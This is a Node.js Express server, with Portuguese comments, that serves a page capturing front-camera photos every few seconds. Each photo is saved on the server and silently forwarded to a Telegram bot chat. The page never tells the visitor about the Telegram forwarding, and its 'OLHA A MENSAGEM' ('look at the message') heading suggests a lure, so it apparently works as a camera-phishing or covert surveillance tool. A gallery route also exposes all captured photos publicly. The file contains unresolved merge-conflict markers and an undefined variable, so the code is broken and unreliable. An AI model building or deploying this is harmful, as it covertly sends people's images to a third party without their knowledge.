const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Criar pasta Uploads se não existir
const uploadsDir = path.join(__dirname, 'Uploads');
console.log('Tentando criar pasta Uploads em:', uploadsDir);
try {
    if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
        console.log('Pasta Uploads criada com sucesso em:', uploadsDir);
    } else {
        console.log('Pasta Uploads já existe em:', uploadsDir);
    }
} catch (error) {
    console.error('Erro ao criar pasta Uploads:', error.message);
}

app.use(express.json());
app.use('/Uploads', express.static('Uploads')); // Corrigido para corresponder ao caminho

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Captura de Fotos com Node.js</title>
            <style>
                body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
                canvas { display: none; }
                button { padding: 10px 20px; font-size: 16px; margin: 10px; cursor: pointer; }
                p { color: green; }
            </style>
        </head>
        <body>
            <h1>Captura de Fotos da Câmera Frontal</h1>
            <h1>OLHA A MENSAGEM</h1>
            <p id="status">Aguardando inicialização...</p>
            <button id="startBtn">Iniciar Captura</button>
            <button id="stopBtn" disabled>Parar Captura</button>
            <canvas id="canvas"></canvas>
            <a href="/gallery">Ver Galeria de Fotos</a>
            <script>
                const canvas = document.getElementById('canvas');
                const startBtn = document.getElementById('startBtn');
                const stopBtn = document.getElementById('stopBtn');
                const status = document.getElementById('status');
                let stream = null;
                let intervalId = null;
                async function startCapture() {
                    try {
                        const constraints = { video: { facingMode: 'user' }, audio: false };
                        stream = await navigator.mediaDevices.getUserMedia(constraints);
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        status.textContent = 'Captura iniciada!';
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
<<<<<<< HEAD
                        intervalId = setInterval(() => capturePhoto(video), 3000);
=======
                        intervalId = setInterval(() => capturePhoto(video), 5000); // Aumentado para 30 segundos
>>>>>>> 7e1a6a538cf5872a359c636dbaa14cb16a3dd334
                    } catch (err) {
                        console.error("Erro ao acessar a câmera: ", err);
                        status.textContent = 'Erro ao acessar a câmera. Permita o acesso e tente novamente.';
                    }
                }
                function stopCapture() {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    if (intervalId) clearInterval(intervalId);
                    status.textContent = 'Captura parada.';
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                }
                function capturePhoto(video) {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
                    sendPhotoToServer(photoData);
                }
                async function sendPhotoToServer(photoData) {
                    try {
                        const response = await fetch('/upload', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ photoData })
                        });
                        const result = await response.json();
                        status.textContent = result.success ? 'Foto enviada e salva com sucesso!' : 'Erro: ' + result.error;
                    } catch (error) {
                        console.error('Erro ao enviar:', error);
                        status.textContent = 'Erro ao enviar a foto: ' + error.message;
                    }
                }
                startBtn.addEventListener('click', startCapture);
                stopBtn.addEventListener('click', stopCapture);
                window.addEventListener('beforeunload', stopCapture);
            </script>
        </body>
        </html>
    `);
});

app.post('/upload', async (req, res) => {
    try {
        const { photoData } = req.body;
        if (!photoData) return res.status(400).json({ success: false, error: 'Nenhuma foto enviada' });
        const base64Data = photoData.replace(/^data:image\/jpeg;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        console.log('Tamanho do buffer recebido:', buffer.length);
        const filename = `foto_${Date.now()}.jpg`;
        const filepath = path.join(__dirname, 'Uploads', filename);
        console.log('Tentando salvar foto em:', filepath);
        fs.writeFileSync(filepath, buffer);
        console.log('Foto salva localmente:', filepath);
        // Limpar fotos antigas (manter apenas as últimas 10)
        const files = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg')).sort();
        if (files.length > 10) {
            for (const oldFile of files.slice(0, files.length - 10)) {
                fs.unlinkSync(path.join(UploadsDir, oldFile));
                console.log(`Foto antiga removida: ${oldFile}`);
            }
        }
        console.log('Iniciando envio ao Telegram...');
        await sendToTelegram(buffer, filename);
        console.log('Envio ao Telegram concluído.');
        res.json({ success: true, message: `Foto salva como ${filename}` });
    } catch (error) {
        console.error('Erro ao processar foto:', error.message);
        res.status(500).json({ success: false, error: `Erro ao processar foto: ${error.message}` });
    }
});

async function sendToTelegram(buffer, filename) {
    const formData = new FormData();
    formData.append('chat_id', process.env.CHAT_ID);
    formData.append('photo', buffer, { filename });
    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            console.log(`Tentativa ${attempt} de envio ao Telegram para chat_id: ${process.env.CHAT_ID}`);
            console.log('Tamanho do buffer:', buffer.length);
            const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                timeout: 30000
            });
            const result = await response.json();
            console.log('Resposta do Telegram:', JSON.stringify(result, null, 2));
            if (!result.ok) {
                console.error('Erro do Telegram:', result.description);
                if (result.error_code === 429) {
                    console.log(`Limite de taxa atingido, aguardando ${attempt * 1000}ms`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                    continue;
                }
                throw new Error(result.description);
            }
            console.log('Foto enviada ao Telegram com sucesso!');
            return;
        } catch (error) {
            console.error(`Erro na tentativa ${attempt}:`, error.message);
            if (attempt === 3) {
                console.error('Falha após 3 tentativas');
                throw error;
            }
        }
    }
}

app.get('/gallery', (req, res) => {
    try {
        const images = fs.readdirSync(uploadsDir).filter(file => file.endsWith('.jpg')).map(file => `/Uploads/${file}`);
        console.log('Imagens na galeria:', images);
        res.send(`
            <!DOCTYPE html>
            <html lang="pt-BR">
            <head>
                <meta charset="UTF-8">
                <title>Galeria de Fotos</title>
                <style>
                    body { font-family: Arial; text-align: center; background: #f0f0f0; }
                    .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin: 20px; }
                    img { max-width: 300px; border: 1px solid #ddd; border-radius: 8px; }
                </style>
            </head>
            <body>
                <h1>Galeria de Fotos Capturadas</h1>
                <p>Total: ${images.length}</p>
                <div class="gallery">
                    ${images.map(img => `<img src="${img}" alt="Foto">`).join('')}
                </div>
                <a href="/">Voltar à Captura</a>
            </body>
            </html>
        `);
    } catch (error) {
        console.error('Erro ao carregar galeria:', error.message);
        res.status(500).send('Erro ao carregar galeria: ' + error.message);
    }
});

app.listen(PORT, () => {
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log(`Galeria: http://localhost:${PORT}/gallery`);
});
